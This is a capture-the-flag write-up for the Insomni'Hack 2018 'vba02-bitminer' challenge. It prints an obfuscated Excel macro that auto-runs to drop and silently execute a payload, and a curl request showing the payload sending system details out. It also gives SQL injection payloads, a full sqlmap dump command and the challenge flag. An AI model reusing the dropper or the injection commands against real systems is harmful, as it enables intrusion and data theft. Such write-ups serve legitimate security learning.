---
title: Insomni'Hack 2018 - vba02-bitminer
---

# {{page.title}}
Solves: 21 / Points: 142
## Challenge description
Oh no I opened an email attachment AGAIN!! Help me to take my revenge. Here is the file I downloaded:
`vba02-bitminer_4052500b4f2120d3d3ae458b339ec1f16e89e870.xls`
## Challenge resolution
This begins again with a .xls file. We follow the same steps as the first `vba` challenge to get the macro:
```vb
Attribute VB_Name = "Module1"
Sub Auto_Open()
    Predict ("Sheet1")
End Sub
Sub Workbook_Open()
    Predict ("Sheet1")
End Sub

Private Function Predict(ByVal z As String) As String

    Dim zzzz As String
    zzzz = "bitcoin.txt"
    Dim zzzzz As String
    zzzzz = Environ("USERPROFILE")
    ChDrive (zzzzz)
    Dim zzzzzz As Integer
    ChDir (zzzzz)
    zzzzzz = FreeFile()
    Dim zzzzzzz As Integer
    Dim zz As Integer
    zz = 4
    Open zzzz For Binary As zzzzzz
    Dim zzz As Worksheet
    On Error GoTo e
    Set zzz = Worksheets(z)
    zzzzzzz = 1
    Do While zzz.Columns(zzzzzzz).Cells(zz, (3 / 2)).Value <> ""
        Do While zzz.Columns(zzzzzzz).Cells(zz, (109 / 87)).Value <> ""
            Put #zzzzzz, , CByte(zzz.Columns(zzzzzzz).Cells(zz, (5471 / 4871)).Value Xor (42 * 2 + 1))
            zzzzzzz = zzzzzzz + (781625 / 679142)
        Loop
        zz = zz + Sqr(2)
        zzzzzzz = 1
    Loop
    Close #zzzzzz
    zzzzzzzz = Shell(zzzz, vbHide)
    Exit Function
e:
    MsgBox "Unable to predict the future"
    Exit Function
End Function
```

We skip the obfuscated components to focus on the important behavior: it creates a file into the `%userprofile%` folder and runs it. We defang the macro by removing the 'Shell' line, open the Excel file and retrieve the 'bitcoin.txt' file it created. Running it in a controlled environment, we see it uses WMI to gather information about the system on which it runs and generates HTTP requests that can be translated into the following `curl` command:
```shell
curl -i -X 'POST' \
    -H 'User-Agent: Bitcoin Mining $couter 0.1 Beta 1337' -H 'Expect: 100-continue' \
    --data '<Base64-encoded string>' \
    'http://bitminer.insomni.hack/?a=benchmark'
```

The decoded Base64 is a JSON object with the following format:
```json
{
    "cid":"NOT-A-SANDBOX",
    "cpu":"Intel(R) Core(TM) i5-4310U CPU @ 2.00GHz",
    "gpu":"Carte vidéo de base Microsoft"
}
```
After playing with the JSON contents, we identify that the server generates an error when a single quote is present in the gpu field. The vulnerability seems to be an SQL injection which can be easily checked by sending the following `gpu` value:
* `' or 1=1 --` always true, returns `go`
* `' or 1=0 --` always false, returns `pwaaa`

Since we are lazy hackers, we use sqlmap to extract the database contents. To do so, we use the `-r` option to define a file containing all of the request information (`*` is used to mark the injection point):
```shell
$ cat raw_request
POST /?a=benchmark HTTP/1.1
Host: bitminer.insomni.hack
User-Agent: Bitcoin Mining $couter 0.1 Beta 1337
Expect: 100-continue
Content-Length: 148
Content-Type: application/x-www-form-urlencoded

*
```

And run the following sqlmap command:
``$ sqlmap -r raw_request --tamper base64encode --prefix $'{"cid":"NOT-A-SANDBOX","cpu":"Intel(R) Core(TM) i5-4310U CPU @ 2.00GHz","gpu":"\' or 1=1 ' --suffix ' -- a"}' --skip-urlencode --level 5 --string go --technique B --dump``

Finaly, we retrieve the flag from the flag table: `INS{M1ninG_i5_t0o_H4rD_Lets_D0_Norm4l_Cyb3rCr1me}`